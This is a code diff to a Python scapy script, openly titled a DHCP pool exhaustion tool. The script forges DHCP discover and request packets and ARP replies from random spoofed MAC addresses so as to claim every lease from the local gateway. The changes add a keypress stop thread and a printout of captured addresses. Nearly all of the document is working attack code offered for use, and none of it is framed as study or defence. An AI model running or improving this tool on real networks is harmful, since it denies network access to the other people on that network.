@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
-"""
-DHCP Pool Exhaustion Tool
-"""
-
+import argparse
+import random
+import threading
+import sys
 import netifaces
 from scapy.all import *
 from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether, ARP
+
+stop_attack = False
 
 
 def get_gateway_ip():
@@ -27,9 +29,6 @@ def get_default_interface():
 
 
 def send_discover(fake_mac, iface):
-    """
-    Broadcast DHCP discover with spoofed MAC
-    """
     dest_ip = '255.255.255.255'
     dest_mac = "ff:ff:ff:ff:ff:ff"
     pkt = Ether(src=mac2str(fake_mac), dst=dest_mac, type=0x0800)
@@ -45,9 +44,6 @@ def send_discover(fake_mac, iface):
 
 
 def send_request(wanted_ip, fake_mac, srv_ip, iface):
-    """
-    Send DHCP request for specific IP with spoofed MAC
-    """
     dest_ip = '255.255.255.255'
     dest_mac = "ff:ff:ff:ff:ff:ff"
     pkt = Ether(src=mac2str(fake_mac), dst=dest_mac)
@@ -65,18 +61,26 @@ def send_request(wanted_ip, fake_mac, srv_ip, iface):
 
 
 def send_arp(claimed_ip, fake_mac, srv_ip, srv_mac, iface):
-    """Send ARP reply to announce presence"""
     pkt = ARP(op=2, hwsrc=mac2str(fake_mac), psrc=claimed_ip, hwdst=srv_mac, pdst=srv_ip)
     send(pkt, iface=iface)
 
 
+def wait_for_enter():
+    global stop_attack
+    input()
+    stop_attack = True
+    print("\n[!] Enter pressed - stopping attack...")
+
+
 def exhaust_dhcp():
-    """
-    Main function - exhausts DHCP pool using auto-detected gateway
-    """
-    # Auto-detect network config
+    global stop_attack
+    
+    # Start thread to listen for Enter key
+    enter_thread = threading.Thread(target=wait_for_enter, daemon=True)
+    enter_thread.start()
+    
     target = get_gateway_ip()
-    iface = get_default_interface()
+    iface = conf.iface
     
     if not target:
         print("[!] Could not detect gateway. Exiting.")
@@ -84,7 +88,7 @@ def exhaust_dhcp():
     
     print(f"[*] Gateway detected: {target}")
     print(f"[*] Interface: {iface}")
-    print("[*] Starting DHCP exhaustion...\n")
+    print("[*] Starting DHCP exhaustion... (Press Enter to stop)\n")
     
     captured = []
     current_src = 0
@@ -98,12 +102,26 @@ def exhaust_dhcp():
         return
     
     while True:
+        if stop_attack:
+            print("\n[*] Attack stopped by user")
+            print(f"[*] Total IPs captured: {len(captured)}")
+            for entry in captured:
+                print(f"    {entry['ip']} -> {entry['mac']}")
+            return
+            
         attempts = 0
         hw = RandMAC()
         # Send discover
         send_discover(fake_mac=hw, iface=iface)
         
         while True:
+            if stop_attack:
+                print("\n[*] Attack stopped by user")
+                print(f"[*] Total IPs captured: {len(captured)}")
+                for entry in captured:
+                    print(f"    {entry['ip']} -> {entry['mac']}")
+                return
+                
             # Sniff for response with timeout
             response = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
             
